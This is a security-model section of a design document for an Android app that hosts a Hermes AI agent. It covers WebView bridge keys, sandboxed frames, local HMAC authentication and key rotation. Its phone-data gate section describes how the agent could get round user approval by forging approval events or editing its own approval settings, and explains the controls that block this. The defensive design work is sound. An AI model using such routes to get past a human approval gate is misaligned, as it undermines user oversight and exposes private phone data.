### 2.3 Security model

The WebView page can do a lot (call Hermes, run things in Termux through the shell, read phone files). The rules
below keep that power with the app's own page and away from content it shows.

**Bridge handshake key and the `METHODS` wrapper.**
- Android injects the `HermesAndroid` object into every frame of the WebView, including the sandboxed iframes
  that show untrusted HTML (canvas pages). So every `@JavascriptInterface` method in `MainActivity.Bridge` takes a
  secret key as its first argument and starts with `if (!ok(key)) return …`.
- On every page load `onPageStarted` calls `newBridgeKey()`: 24 random bytes (hex) for the bridge key and another
  24 for the media key; `keyTaken` is reset.
- `handshake()` (synchronized) hands the key to the first caller after a page load, and an empty string to every
  later caller.
- `secure-bridge.ts` is the first import of `main.tsx`, so the app's own script is that first caller. It calls
  `handshake()`, then replaces `window.HermesAndroid` with a wrapper that has exactly the names in its `METHODS`
  list (52 names; full table in 4.5), each adding the key. A frame that only sees the raw object can't make a
  single call. `ok(key)` compares in constant time (`MessageDigest.isEqual`).
- A new bridge method must take the key first, check it, and be added to `METHODS`.

**WebView remote debugging is off, except in test builds.** With remote debugging on, anything that can reach `adb` on the phone can read the page (token, chats) and call every bridge method, and on these phones Termux is paired with Wireless debugging (4.7), so `adb` is reachable from the phone itself. So `MainActivity` never calls `WebView.setWebContentsDebuggingEnabled(true)`, with one exception: a test build made with `HM_DEVTOOLS=1 android/build.sh` (7.1). That adds the string resource `hm_devtools` (value `1`); `MainActivity.devtoolsBuild()` reads it with `getIdentifier` and, only when it is `1`, turns debugging on before the `WebView` is created. The same build ends its version name with `+devtools`, and the page shows a warning strip (3.2). Guards: `build.sh` exits 1 when `HM_DEVTOOLS` is set together with `KEYSTORE` (the release key), as its very first step and before any SDK check (`tools/test_devtools_guard.sh` tests this); `release.yml` fails the release when `resources.arsc` of either file it attaches (`hermes-mobile.apk`, `hermux.apk`) contains `hm_devtools`. No bridge method was added.

**Remote debugging as a setting (Settings → About → Remote debugging).** The installed app, release included, can turn WebView remote debugging on for a short time, to debug a problem that only shows on the user's own install. Threats and answers:

1. *Script in the page* (a sanitiser bug, a bad card, a bad dependency holds the bridge key). **No bridge method turns it on.** The page may only call `openRemoteDebugging` (asks the shell to show its own confirmation), `remoteDebuggingState` (read-only JSON `{available, on, minutesLeft}`) and `turnOffRemoteDebugging` (turning off is always safe). All three take the per-page key first and are in `secure-bridge.ts`; `tools/web-e2e/checks/12-app-shell.cjs` checks that no name there suggests enabling.
2. *Hermux driving the phone* (background app, Shizuku could tap a switch). Turning on needs the phone's screen-lock credential, which nothing can type for you: `Bridge.openRemoteDebugging` runs `MainActivity.askRemoteDebugging`, a **native** `AlertDialog` ("Turn on remote debugging?", Cancel / Continue; shown only while the app is on screen, one at a time); Continue runs `KeyguardManager.createConfirmDeviceCredentialIntent` through `startActivityForResult` (request code `REQ_DEVTOOLS`). Only `onActivityResult` with `RESULT_OK` for that request, and only if the app itself launched it (`devtoolsPending`), calls `DevTools.turnOn`, which checks Developer options and the screen lock again. With no screen lock (`isDeviceSecure()` false) a toast says "Set a screen lock first" and it stays off.
3. *Forgetting it on.* The state is one static field in `DevTools` (process memory only), so a process restart turns it off (`DevTools.recheck` runs in `MainActivity.onCreate` and `HermesService.onCreate` and drops a notification a dead process left; when it is off and was never on in this process it doesn't touch WebView, so the service's start at boot doesn't load WebView). It ends after 60 minutes (`DURATION_MS`; one bounded `Handler` callback, also re-checked in `MainActivity.onResume`, because a sleeping phone delays the callback), and from the ongoing notification `Remote debugging` (4.3) with a Turn off action.
4. *Ordinary users.* The row (and `available`) exist only while Android Developer options are on (`Settings.Global.DEVELOPMENT_SETTINGS_ENABLED`); `onResume` turns it off if they were turned off.

A test build (`devtoolsBuild()`) keeps debugging on whatever this setting does: `DevTools.apply` enables it when `isOn() || testBuild`. The notification's Turn off action is a `PendingIntent.getService` with an explicit intent (action `ACTION_OFF`, `DevTools.ACTION_OFF`) to `HermesService`, which is `exported="false"`, so no receiver was added and the manifest did not change. No new permission. Whether an already attached DevTools session is cut when it is turned off is recorded in `docs/manual-tests.md`.

**`safeRequest` / `safeLink`.**
- `safeRequest(method, path)`: the only REST calls the shell makes for the page (`httpAsync`, `streamGet`) are
  `GET`, `POST`, `PUT`, `DELETE` or `PATCH` on a path that starts with `/api/`, is at most 4,096 characters and has
  no control characters or spaces (no header injection). Anything else answers 400 "blocked request". The shell
  adds the dashboard token itself; the page never holds it for REST.
- `safeLink(uri)`: links handed to other apps (`openExternal`, and main-frame navigations in
  `shouldOverrideUrlLoading`) must be `http`, `https`, `mailto` or `tel`; `intent:`, `file:`, `content:`,
  `market:` and the rest are dropped. Sub-frame navigations never leave the app (`!req.isForMainFrame()` → blocked),
  and the page itself only navigates within `file:`.
- Other input checks in the bridge: `openFile` takes only absolute paths without `..` or NUL and passes them as
  arguments, never as script text; chat ids from the page match `[A-Za-z0-9_.:-]*` and are at most 200 characters;
  `setUnseen` keeps at most 500 rows; `setReadAloud` takes valid JSON up to 200,000 characters; `shareText` up to
  400,000 characters; `ttsControl` only `play|pause|toggle|rew|ff|stop`; `installHelperApp` only the four helper
  apps; `uninstallApp` only its fixed list.
- WebView settings: JavaScript and DOM storage on; file access only for the app page itself
  (`setAllowFileAccessFromFileURLs(false)`, `setAllowUniversalAccessFromFileURLs(false)`,
  `setAllowContentAccess(false)`). Cleartext traffic only to `127.0.0.1` and `localhost`.

**Sandboxed canvas iframes.**
- HTML documents (canvas, gallery) run in `<iframe sandbox="allow-scripts allow-forms allow-modals"
  referrerPolicy="no-referrer" srcDoc>` (`web/src/components/HtmlFrame.tsx` `HtmlFrame`, srcDoc built by `frameDoc` in `web/src/htmlframe.ts`; also used for the inline chat preview). No `allow-same-origin`, so the frame has no
  access to the app page, its storage or its cookies.
- A guard script is injected first (right after the doctype): it deletes `window.HermesAndroid`, reports errors,
  routes `alert()` to an app toast and turns taps on `http(s)` and `mailto` links, and `window.open` calls with
  such an address, into a message to the page (`#` and `javascript:` links are left to the frame; other links are
  stopped). The page accepts only `http(s)` and `mailto` addresses of up to 2,000 characters (`frameLink`) and opens
  them with `openExternal`. It opens right away only when the message follows a real tap in the frame (the page has
  transient user activation, `navigator.userActivation`, and the frame has focus), at most one link per 5 s; otherwise (a page posting on its
  own) it asks "Open link?" first. The Android shell also blocks every navigation of a sub-frame.
- Unless the document's Online switch is on, a CSP blocks all network (`default-src 'none'`, inline script/style
  only, images and media from `data:`/`blob:`, `form-action 'none'`, `base-uri 'none'`).
- The real isolation is the bridge key: the raw bridge object is visible inside frames even after the guard, but
  useless without the key.

**Video player frames (3.3, Video player).**
- A player is a site's page in `<iframe sandbox="allow-scripts allow-same-origin allow-presentation" allow="autoplay; encrypted-media; fullscreen; picture-in-picture">`, loaded only after the user taps its card. `allow-same-origin` lets the frame keep its own site's storage, which players need; the address is always https, so it is never the app's origin. No `allow-popups` and no `allow-top-navigation`: nothing in the frame can navigate the app's main frame, which is what guards the bridge key (a main-frame load makes a new key that the first caller gets). The players' own links therefore do nothing, and the card's Open button is the way out. The bridge object is visible inside the frame like in any other, and useless without the key. Anything but `http`/`https` a player tries (`intent:`, `vnd.youtube:`) is blocked as a sub-frame navigation.
- `MainActivity.shouldInterceptRequest` answers the host `EMBED_HOST` itself, never over the network (`embedPage`): `/embed?u=<address>` gives a small page (`embedHtml`) holding the player in an inner frame, with a CSP allowing only https frames. Only a plain https address of up to 2,000 characters is accepted, and it is HTML-escaped; anything else answers 404. Why it exists: the app's page is a `file:`, which sends a player no `Referer`, and YouTube refuses to play without one. `https://<application id>` is the form YouTube asks apps to send. The page holds no secret and any page may load it.

**rehype-sanitize (chat messages).** Markdown from the model may contain raw HTML; `Markdown.tsx` renders it
through `rehype-raw` and then `rehype-sanitize` with an extended schema: a list of safe extra tags, inline SVG with
presentation attributes only (no `script`, `foreignObject`, `use`, `image`, `a`, `style`, animation), `style` on
any element but filtered by `rehypeSafeStyle` to looks-only properties, and the extra link protocol `hermes-chat`.
Links open through `openExternal` (so `safeLink`). OpenUI cards (3.9) are rendered by their own library in the
page; their actions can only call read-only tools through `POST /openui/call`, and their links pass
`safeHttpUrl` (http/https only).

**Event key `~/.hermes-mobile/key`.**
- The key has one owner, `LocalKey`: `HermesService.ensureKey`, the listener, `pokeTicker` and
  `MainActivity.dashboardToken` all take it from `HermesService.keys` (`LocalKey.current`), never from the prefs
  directly. It makes a 24-byte random key once and keeps it in the app's prefs (`hermes` → `event_key`).
- Once per service run, and only after Termux has accepted a command, `shareKeyWithTermux` writes it to Termux's
  `~/.hermes-mobile/key` (a `RUN_COMMAND` running `sh -c` with `LocalKey.shareCommand`: `umask 077`, the folder made,
  the key written to `key.<pid>.tmp` and moved over `key` with `mv -f`, so a reader sees the old key or the new one,
  never an empty file; when the write or the move fails the temporary file is removed and the command fails; only a
  lowercase hex key gets a command). A new key is used only once it is saved: `LocalKey.current` retries a failed save
  once, then puts the old values back (Android's `commit` keeps unsaved values in memory) and throws
  `LocalKey.NotSaved`, and the caller sends nothing; `rotate` does the same. `shareKeyWithTermux` counts the key as
  shared (`keyShared`) only once it was saved and its command handed to Termux (`LocalKey.share`), so the next trigger
  tries again otherwise. `shareKeyAgain` repeats this when Termux first
  accepts a command (first good probe, installer DONE), and the dashboard check's key share uses the same command.
- **Rotation.** `LocalKey.rotate(why)` (`why` one of `WHYS`: `update`, `enforce`,
  `legacy_seen`, `user`) makes a new key and keeps the previous one accepted for 24 h (`GRACE_MS`; prefs
  `event_key_prev`, `event_key_prev_until`) so Termux processes that still hold it keep working until the new key file
  reaches them, both with the raw key and with signed requests (their hello names the old key's id, and the listener
  proves with it); `LocalKey.confirm(kid)`, called for every request the listener verifies under the current key's id,
  cuts that grace to 2 minutes (`CONFIRM_MS`) and records that Termux holds the current key (`event_key_seen`).
  `accepted()` is the current key plus the previous one while its grace lasts (never more than 24 h ahead of the
  clock), `byKid(kid)` picks one of them by key id (the app as a client), and `event_key_version` records the app
  version a key was made under. Who rotates: `LocalKey.tick` after every app update (`event_key_version` isn't this
  version: on service start, before the first share), at the end of the compatibility window (`enforce`, below) and
  `legacySeen` (a raw key after it); no schedule and no Settings row (owner's decision open,
  `docs/decisions/local-authentication.md`). `rotateWait(why)` limits them: one every 5 minutes (`MIN_ROTATE_MS`,
  `event_key_rotated_at`; a clock set back counts as time passed), never while the previous key is in its grace and
  `event_key_seen` is false (so at most two keys count and none Termux may still use is dropped early; the wait is then
  until the grace ends or a confirm), `update` once per version, `enforce` once, `legacy_seen` once a day
  (`LEGACY_EVERY_MS`, `local_legacy_at`) and only after the switch. A request verified under the previous key
  (`LocalKey.stale`) shares the key again, as does `StartReceiver` (the keeper wakes the app when the listener names a
  key Termux doesn't hold: `HermesService.reshareIfDue`), but only when the listener has seen Termux use a key that
  isn't the current one since the last share (the previous key, or a hello hint naming a key id that is no accepted
  key: `LocalServer.Keys.foreignHint`, `LocalKey.foreignHint`, `reshareWanted`), so a bare nudge runs no Termux
  command; each at most every 10 minutes (`RESHARE_MS`, `LocalKey.shareDue`). `HermesService.report` records `local key_rotated why=<why> side=app`.
- Every sender reads that file: the plugin (`_key`, re-read when its inode, modification time in ns or size changes, through `local_auth.KeyFile`; an empty file is never kept), `cron_ticker.py`,
  `hm-local` (for `hm-shizuku` and the supervisor). The Termux-side senders sign each `POST /event` after a hello
  (below) and never send the key itself; the app's listener still accepts it in `X-Hermes-Mobile-Key`. The
  listener binds to `127.0.0.1` only, compares in constant time against every accepted key, reads the request through
  `LocalServer` (a head of at most 8 KiB and 40 header lines with CRLF endings, a body of ≤ 256 KiB), and answers 204
  or 403. The cron poke on 9122 sends the same key (or local authentication's `POKE`, below).
- `POST /setup` uses its own one-time token instead (made when the app copies the installer command, body
  ≤ 1 KiB; `SetupLines`, 4.1).
- `POST /phonedata` (the agent reading the phone's contacts, calendar, call log, messages, location or latest photos;
  decision `docs/decisions/phone-data-read-only.md`) takes the same key and a body of ≤ 4 KiB, and lets a read through
  only with one of two things the agent can't make: a **one-use grant** or the **Full access pass**. Both live in
  `PhoneDataGrants` (memory only, nothing on disk). Hermes saying "approved" counts for nothing, because it says so with
  no prompt under `/yolo` or `approvals.mode: off`, and the agent can edit that setting. See "Phone data gate" below.
- `GET /plugin-bundle/<token>` answers the APK's own plugin bundle (`assets/phone/plugin.tgz`) only while a plugin update
  runs and only to its one-time token (48 hex characters, compared in constant time; 403 otherwise). The script checks
  the bytes against the SHA-256 in the APK before unpacking, so the plugin update installs nothing that didn't come
  from the signed APK (6.6).

**Local authentication (`hermux-local-v1`).** A client checks that the local server holds the shared key before it sends that server anything private, and then signs its request instead of sending the key. The primitives are in `LocalAuth` (app) and `local_auth.py` (plugin), checked against the same vectors: a proof or MAC is HMAC-SHA256 under the key over `hermux-local-v1`, a direction (`server`, `client`, `answer`), a role (`dashboard`, `events`, `ticker`, `bghost`), the server's own listening address `127.0.0.1:<port>`, the client's nonce, the server's nonce, what is signed and the SHA-256 of the body.
- **Roles and their servers.** `dashboard` is the plugin's `_TokenGuard` in front of Hermes on 9119; `ticker` is `cron_ticker.py` on 9122; `bghost` is `BgHost` (its per-start token is the key); `events` is the app's listener on 9121 (`EventsListener`, through `LocalServer`; it proves with the key the client's hint names when `LocalKey` still accepts it, else with `LocalKey.current`).
- **Hello.** The client sends a fresh nonce and, as a hint, the id of the key it holds (`kid`, optional and not secret: `GET /hermux/hello?v=1&nc=<nc>&kid=<kid>`, or `HELLO 1 <nc> <kid>` to the ticker; `LocalAuth.helloArgs`, `local_auth.hello_args` and `hello_line` read it, and a hint that isn't 8 lowercase hex characters counts as absent; a hint is never percent-decoded, so an encoded `kid` is malformed and counts as absent). The server proves with the accepted key that id names (current, or the previous key within its grace: `LocalServer.helloKey`, `local_auth.hello_key`), else with its current key, so a client with an unknown key still sees `unknown_kid`; the one request must then be signed with that same key. The Termux-side servers hold one key, so they ignore a hint for any other. The server answers with its key id (`kid`), a fresh server nonce, the address it listens on (taken from its own socket, never from the request) and the `server` proof over all of them. The client requires the address it dialled, a key id it knows and the proof, and sends nothing more otherwise.
- **Request MAC.** On 9121, on 9122 and for `BgHost` the one request follows on the same connection, so the peer that proved itself is the one that gets it: `X-Hermux-Auth: 1 <kid> <ns> <mac>` (the app's listener and `BgHost`, through `LocalServer`) or the line `POKE 1 <mac>` (the ticker), a `client` MAC over `<METHOD> <path with query>` (`POKE` for the ticker) and the raw body bytes. The server nonce lives only in that connection's handler and is used once.
- **The dashboard.** The hello and the token step are two HTTP requests, so `_TokenGuard` keeps each server nonce with its client nonce for 10 s, single use, at most 256 (`local_auth.PendingHellos`, the oldest dropped). `GET /hermux/token` must carry `X-Hermux-Auth: 1 <kid> <ns> <nc> <mac>`; the answer holds Hermes's session token and an `answer` proof over its SHA-256. A REST request may send `X-Hermux-Nonce: <nonce>`; its answer then carries `X-Hermux-Proof: 1 <kid> <proof>`, an `answer` proof over that nonce, the address and `rest <status>` (the body is not covered, so streaming is untouched).
- **Bounds.** HTTP heads at most 8 KiB and 40 header lines with CRLF endings, one `Content-Length`, no `Transfer-Encoding`, a body cap checked before reading, 3 s per read and 10 s for the connection (`LocalServer`); ticker lines at most 256 bytes, 2 s per read, 5 s for the exchange. Anything malformed gets an error answer or nothing, never a proof.
- **Compatibility.** During the compatibility window (below) every server still accepts the raw key as before: the event key on the `/` page (`X-Hermes-Mobile-Key`) and as the ticker's first line, the event key in `X-Hermes-Mobile-Key` on the app's listener (the current key, or the previous one during its grace; only on a request without a hello, and recorded as the diagnostic event `local legacy_key port=events` at most once an hour), and `X-HM-Token` on `BgHost` unless it was started with `HM_AUTH=mac` (the plugin always starts it so, on a kernel-picked port; only an older plugin starts it without). `_TokenGuard` and the ticker stop accepting the raw key once `~/.hermes-mobile/enforced` exists, the app's listener once `local_enforced` is saved (`LocalKey.rawAccepted`).
- **The compatibility window and its end (`LocalKey.tick`, `ENFORCE` on).** The window begins with the update that brings local authentication; the app closes it by itself. `tick` runs on service start (before the first share), after every plugin run's answer (`PluginSync.done`, which also records the run's `HMPLUGIN SCRIPTS ok`/`fail` line through `LocalKey.scriptsLine` and `scriptsCopied`: `local_scripts_ok`, and `local_verified` cleared), after a share when Termux first accepts a command (`shareKeyAgain`), at most once a minute after verified requests, and once more when a rotation limit asked for it (one `Handler` message, no wake lock), on one thread (`HermesService.localTick`, `KEY_THREAD`). The conditions (`LocalKey.ready`, from `LocalKey.Facts`: the app's own state only, never a port's answer): the phone is set up (`termuxOk`, not uninstalling); `PluginSync` says `current` and the installed stamp speaks the hello by the same rule as the app's clients (`LocalDashboard.plugin`, `P_HELLO`); the last scripts line said `ok`; a request verified under the current key came from Termux after it (`local_verified`, set by `confirm`); the cron ticker was heard running the new code after it (`local_ticker_ok`, `LocalKey.tickerSeen`: a signed `wake_at` or `cron_idle`, or a verified poke; a raw one, from an older ticker that would keep sending the key, clears it); and no plugin update or installer runs. Then three recorded steps: (1) `rotate` with `why=enforce`, saving `local_enforce_kid` in the same commit; (2) the share, `LocalKey.shareCommand(key, Mode.ENFORCED)`: an empty `enforced.<pid>.tmp` moved over `~/.hermes-mobile/enforced`, then the key moved over the key file, in one `RUN_COMMAND`, so a Termux that holds the new key has the file; from step 1 on every share uses this command (`shareMode`), and while Termux hasn't used the new key it is shared again every 10 minutes; (3) `local_enforced`, saved by the first `confirm` under a key written that way (`local enforced why=ready side=app`), from when the listener refuses the raw key. **The cap:** after 14 days (`CAP_MS`) of the window counted in real time since boot, never the wall clock (`LocalKey.window`, `capReached`: `local_window_ms` the time counted (never above the cap), `local_window_seen` the time since boot and `local_window_boot` the boot count (`HermesService.bootCount`, `Settings.Global.BOOT_COUNT`; -1 when unreadable) at the last look, `local_window_version`; started at 0 by the first `tick` once the phone is set up; each look adds the time since boot now minus at the last look when it didn't go down (whatever the boot counts say), else only the time since this boot (a reboot), or nothing when the boot count is unchanged or the stored time since boot is missing or below 0 (damaged values); kept across later versions; started again by an older version or a damaged length). Each look adds at most the real time since the one before, so the cap never comes before 14 days of real time; it misses the time from the last look before a shutdown to the shutdown and the time switched off, so while the window is open the app looks at least hourly (`LocalKey.lookAgainMs`, `LOOK_EVERY_MS`: one non-waking, inexact `ELAPSED_REALTIME` alarm, `HermesService.lookLater`, none once the window is closed) and at every connection to its listener (at most once a minute), but only while the phone is set up and the window is counting (`lookAgainMs(setUp)`): a phone awake enough for those looks and restarted every night reaches the cap after about 15 days, up to about 16 to 18 when the nightly restart lands while Doze holds the alarm back, and every phone that keeps running gets there, so a clock in the past at boot, set forward or set back changes nothing, and time switched off isn't counted (the cap only comes later), steps 1 to 3 run without the conditions (`local enforced why=cap side=app`), and `local_cap` turns on the Setup row "Phone scripts out of date" while the last scripts line was not `ok` (`LocalKey.scriptsOld`, `scriptsRow`, `setupState.phoneScriptsOld`, 3.18); the row's button follows the plugin's state (`LocalKey.scriptsFix`, `setupState.phoneScriptsFix`: replace a hand-changed plugin after asking, none for a held or newer one). The installer's `DONE` starts a plugin check at once (`SetupLines.checksPlugin`), so a fresh install meets the conditions without waiting for a later start. A raw key after the switch is refused like a request without one: on the listener it is noted once a day as `local legacy_key port=events side=app`; the guard (`_note_legacy`) and the ticker (`note_legacy`) note it once a day too and send the app a signed `local_legacy` event (`local_auth.report_legacy`, 4.4); each leads to `LocalKey.legacySeen` (`local_legacy_seen_at`, `local_legacy_run`): while `local_cap` is on, after `LEGACY_MAX_RUN` (3) such rotations in a row they stop (`local_legacy_paused`, noted once as `local legacy_paused side=app`), until two days pass between two raw keys or an app update rotates the key. A build with `ENFORCE` false (a rollback) shares with `Mode.OPEN`, which removes the `enforced` file, its listener accepts the raw key, and `LocalKey.forgetSwitch` clears the switch's steps, `local_cap` and the window, so a later build with it on waits for the conditions again.
- **Every state has a way back.** In the window and during steps 1 to 2 the listener accepts the raw key and signed requests under the old key (its grace, picked by the kid hint), so the app's own helpers never lose it before the new key reaches them. A crash after any step: the next start reads the saved steps, never rotates twice and shares again. A share not handed over (no permission, Termux gone): tried on every trigger; Termux clients sign with the previous key for its 24 h, and a Termux holding an older key gets the key again through `confirm`'s stale check, the keeper's wake (`StartReceiver`) and the dashboard check's share (4.3); if shares keep failing the Setup check's Termux permission row shows why. Reinstalling the app or clearing its data: a new key shared with `Mode.KEEP` (an `enforced` file left in Termux stays, which nothing new needs), `unknown_kid` makes the app share it again, and the window runs again. Termux's data cleared: the installer makes everything new, and its `DONE` shares the key (with the `enforced` file once the switch ran). An older app after the switch (a downgrade): it can't get the dashboard's token (the guard withholds it from the raw key) and the plugin's events fail its hello, so urgent ones become the Termux:API notification "Update the Hermux app" (5.0); it stays cut off until the app is updated again, which fixes it (or the way out by hand, below). A plugin update that can't succeed (rolled back every time, or a held plugin): after the switch the app sends that Hermes nothing until the plugin is fixed; "Update anyway" helps only when the failure passes, so the release checklist (7.5) checks the plugin on the oldest supported Hermes. **The way out by hand.** In Termux, `rm ~/.hermes-mobile/enforced` makes the dashboard guard and the cron ticker accept the key itself again, for anything that can read the key file (an older app or plugin, or a script); the app's own listener keeps refusing it until the app is reinstalled or its data cleared, and the app writes the file again with its next key share once its switch has run. It is a recovery step only, not a setting. An interrupted plugin update: `busy`, so the switch waits; `plugin-update.sh` settles it on its next run. A held or hand-changed plugin: the cap, the Setup row and "Update anyway" (which works without the raw key, `OK <stamp> unverified`, 6.6). Two Hermes processes with different keys during the grace: the listener accepts both, the app picks by the server's kid, and each process re-reads the key file when it changes (`local_auth.KeyFile`); after the grace the old one gets `unknown_kid` and reads the file again.
- **The Termux and plugin side's clients.** Each verifies the server before it sends anything private and then signs its one request; none sends the raw key: the plugin's `_post` (every hook, and `phone_app`'s `bgapp` event with the background host's token), `phone_data` (whose answer rows are trusted only because the connection proved itself), `phone_app` to `BgHost` (role `bghost`, the per-start token as the key, a kernel-picked port read from the host's own `LISTENING <port> <kid>` line), `_own_page_token` (the token taken in process, a verified dashboard otherwise), `cron_ticker.py`'s events, `hm-shizuku` and the supervisor through `hm-local`, `plugin-update.sh` (`hm-local token`), and the developer tools (5.0, 5.2, 5.4, 6.1, 6.2, 6.6, 7.2). On a failed verification (the closed reasons `no_answer`, `no_hello`, `old_version`, `bad_addr`, `unknown_kid`, `bad_proof`, `refused`) a client sends nothing, waits before trying that server again (1 s doubling to 300 s, reset by a success; not after `no_answer`), and writes one fixed diagnostic event (`local unverified port=… why=… side=…`, 3.21) holding no key, key id, nonce, proof or port number. Urgent plugin events fall back to a Termux:API notification (5.0). The supervisor waits only for a dashboard that verifies (6.2), and its keeper wakes the app when its port doesn't verify.
- **An app older than the plugin.** Its listener answers the hello with 403, which reads as `no_hello`: nothing is sent, urgent events become the Termux:API notification "Update the Hermux app", and the raw key is never tried instead.
- **The one exception.** `plugin-update.sh` may send the raw key to the dashboard's `/` page, only in `apply`, only while its own Debian-side inspection (the installed plugin's `BUILD_STAMP` and guard files on disk, never anything from the port) says the installed plugin is older than local authentication, and only until Hermes restarts with the new plugin, never again in that run, and never once `~/.hermes-mobile/enforced` exists (6.6). Each such run is noted as `local legacy_key port=dashboard side=termux`.
- **Release order.** The plugin starts `BgHost` with `HM_AUTH=mac`, so the host refuses the raw `X-HM-Token`; the app's own requests to it (`MainActivity.bgRequest`, `HermesService.fetchBgThumb`: the live view, taps and typed text from the viewer) sign too: `MainActivity.bgRequest` and `HermesService.fetchBgThumb` say hello to the host when the `bgapp` event says `"auth":"mac"` (below), so the app and this plugin must ship together, or an app without that gets 403 from the viewer while the tool itself keeps working.
- **The app as a client.** The app never sends the shared key to a local port; it sends nothing private before a hello verifies. The dashboard's session token comes from `LocalClient.dashboardToken` (`MainActivity.dashboardToken`, for the page's every WebSocket connect, its REST calls, notification answers and Stop); REST calls and the `/media` proxy say hello on their own connection first (5 s; answers from a notification, Approve and Stop, are allowed 30 s, as a busy dashboard may need, and one more try on a new connection when nothing answered) and send the token and the body only on that verified connection; they carry `X-Hermux-Nonce` and take an answer only with a valid `X-Hermux-Proof` (`LocalDashboard`), otherwise it is dropped with the error of a dashboard that isn't answering and every cached token is dropped; without a token nothing is sent. The cron poke is `LocalClient.poke`. The background host is verified with its per-start token (role `bghost`) when the plugin's `bgapp` event says `"auth":"mac"`; an event without it means an older plugin started the host: the app sends that host nothing (`LocalClient.bgMode` gives `NONE`, `LocalClient.bgOld`), so there is no live view, tap or typed text from the viewer, and the app shows "Update the Hermux plugin" and lets `PluginSync` update it; the agent's own tool keeps working with its own host. What the user sees when the dashboard isn't verified is `LocalDashboard.Watch`'s decision (4.3): nothing while nothing answers (Hermes starting); when something answers without a valid hello, the "Update the Hermux plugin" notice if the installed plugin is known to be too old, and otherwise the key shared again (a dashboard of ours without its key file answers that way) and "Hermux stopped talking to Hermes" once that was seen twice 10 s apart; that alert at once for a hello naming another address; for a wrong proof or an unknown key id, the key shared again through Termux's `RUN_COMMAND` (never to the port), tries after 5 s and 20 s, then the alert, only when that share reached Termux. A share in the episode also holds a no-hello alert until 20 s after it. While an alert is up the dashboard is tried again (30 s, doubling to 5 minutes, 8 times, a try counted only once it is due) so it can clear; a verified hello clears it, from a token try or from a REST call. Each failure is the diagnostic event `local unverified port=<dashboard|ticker|bghost> why=<reason> side=app` (nothing answering on the dashboard is not recorded). The page's WebSocket opens right after a verified hello; the moment between the two is not covered. The page shows these alerts as a banner with its own fixed text only (`LocalAlertBanner`, 3.2): the shell names one of two kinds through the page callback `window.__hmLocalAlert`, and the page never shows, logs or keeps what it is called with; a script in the page could call that callback too, which can only show or hide one of those fixed banners (accepted).
- **Compatibility for the app's clients.** Whether the app expects a hello is decided only by what the app itself knows (the plugin stamp `PluginSync` last read from disk, and the APK's own), never by what a port answers. With a plugin known to be too old the app sends the dashboard nothing, shows "Update the Hermux plugin" and lets `PluginSync` update it even while the app is on screen; Hermes is unreachable from the app until then. A plugin held or changed by hand gets "… Settings → About → Plugin → Update anyway." instead.
- **The listener's own port.** When 9121 can't be bound, the app sends a hello to it (`LocalClient`, role `events`; nothing else): a listener that proves our key is one of ours left open, which is closed and the port taken again at once; anything else holds the port, and the app sends it nothing, tries again with a bounded back-off and tells the user ("Hermux can't hear from Hermes", 4.3, 4.4).

**Phone data gate (`PhoneDataGrants`, `PhoneDataRoute`, `web/src/phone-data-request.ts`).** The threat: the agent runs in Termux, so it can read the shared key, call local ports, post a fake `approval` event to `/event` and edit Hermes's settings. So nothing it can write lets a read through.
- **The one-use grant.** `PhoneDataGrants.issue(description)` is called only by the page (bridge `phoneDataGrant`, per-page key, so a canvas frame can't call it) when the user taps Allow once on a phone-data approval. It parses the description strictly (`parse`: `phone_data:v1:<kind>:<12 lowercase hex>:<even-length lowercase hex of the args text>`, a real kind, at most 1,024 bytes of args, valid UTF-8 that is printable ASCII and one JSON object) and stores nonce → kind and args text for 2 minutes (`TTL_MS`), at most 16 at once (`MAX_GRANTS`, the oldest dropped). `consume(nonce, kind, args)` is true once and only for exactly that kind and args text; a failed attempt returns false the same way for every cause (constant-time comparison) and does not use the grant up, so nothing that knows a nonce can burn the user's tap, while the grant still lets through only that exact read.
- **When the grant is made.** In `respondNow` of `gateway.ts`, the last step of every answer (the sheet, Live mode's voice and anything else go through `answerRequest`), so after the lock-screen and fingerprint steps (3.6) and before `req.respond` sends the answer to Hermes; only for `choice` `once` on text that parses; Deny, Allow this session and Always allow make none (a `session` or `always` answer to such a request is sent as `once`). If the shell can't make the grant (no bridge, an older shell, a refusal) the Allow is not sent and the request stays open.
- **The notification can't allow it.** The `approval` event also arrives on `/event`, which the agent can post to, so a notification must not mint a grant: for a phone-data approval (`HermesService.phoneDataEvent`; only a request whose description is `phone_data:` text AND whose command is exactly Hermes's label for the tool, `<phone_data> (plugin approval rule)`, counts as one: a shell command that merely mentions `phone_data:` is an ordinary approval, on the page too) Allow once only opens the app on that chat (`approveIntent`; `answerApproval` also refuses a non-Deny answer carrying `phone_data`), where the sheet's request came from Hermes itself. Deny works from the notification. A phone-data approval notification (`HermesService.hideOnLockScreen`, applied to the heads-up post, the re-alert and the live approval notification) is `Notification.VISIBILITY_PRIVATE` with a public version that only says "Hermux needs your approval", with no kind, search text or wording: a phone that locks after the notification was posted shows nothing of the request. Other approvals are unchanged. The status answer's `locked` (the same `MainActivity.keyguardLocked` check as the read) makes the plugin stop before asking when the phone is already locked.
- **The Full access pass.** `fullAccess(session, on)` and `hasFullAccess(session)`: a set of live session ids in memory, at most 64; an empty session never counts, and `fullAccess("", false)` clears every chat. The page calls bridge `phoneDataFullAccess(runtimeId, on)` after `setAccessNow` settles, with `on` only when the user asked for Full access (`mode === 'full'`) and Hermes confirmed it (never from the lock screen, because `setAccessNow` refuses Full there). It turns it off when the chat leaves Full access or goes to Auto access, in `chatClosed` (the live session ended), at the start of every chat open (Hermes forgets `/yolo` on a resume; the pass comes back only through `setAccess` re-applying the access), and when the page loads. The shell also clears every pass when a page starts (`MainActivity` `onPageStarted`) and when the activity is destroyed (`onDestroy`), so a pass never outlives the page that set it. The owner's rule "First Allow only" stays: the fingerprint is asked on a chat's first Allow only (3.6), never on every read. Fail closed: `setAccessNow` clears the pass BEFORE the `config.set` call for every mode but Full, and sets it only after a confirmed switch to Full, so a switch to Off whose `config.set` fails (the agent can make it fail) leaves the chat without the pass.
- **Which chat id.** The pass is keyed by the gateway's live session id, the page's `runtimeId`. Hermes sets it for each turn in a context variable (`HERMES_UI_SESSION_ID`, set to the gateway `sid` in `prompt_turn.py`), so concurrent chats each see their own; unlike the agent's durable session id it is not rotated by a context compression. The plugin reads it from the variable itself, never from `os.environ` (process-wide), and sends it as `session`; without it the plugin sends the durable id, which never matches, so the read answers `no_grant` and the tool says so. (Compression used to rotate the id the pass was keyed on; that is why it moved.)
